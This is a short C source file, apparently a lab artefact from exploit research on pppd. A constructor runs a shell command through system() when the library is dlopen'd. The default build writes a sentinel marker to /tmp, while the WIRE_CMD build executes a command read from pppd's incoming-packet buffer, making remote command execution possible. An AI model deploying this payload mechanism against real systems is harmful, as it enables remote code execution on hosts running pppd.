/* W133 lab payload: constructor runs a benign shell command when dlopen'd.
 * WIRE_CMD builds read the command from a fixed address in pppd's
 * inpacket_buf, so the command itself is carried by the wire frame.
 * Built with -DSENTINEL_PATH='"..."' or -DWIRE_CMD -DCMD_ADDR=0x...
 * This file is a lab artefact, not part of any shipped pppd source.
 */
#include <stdint.h>
#include <stdlib.h>

#ifndef SENTINEL_PATH
#define SENTINEL_PATH "/tmp/pppd2shell-r5-w133a-victim"
#endif

__attribute__((constructor))
static void w133_payload(void)
{
#ifdef WIRE_CMD
    const char *cmd = (const char *)(uintptr_t)CMD_ADDR;
    system(cmd);
#else
    system("/bin/sh -c 'echo PPPD2SHELL_W133_COMMAND_RAN > " SENTINEL_PATH "'");
#endif
}
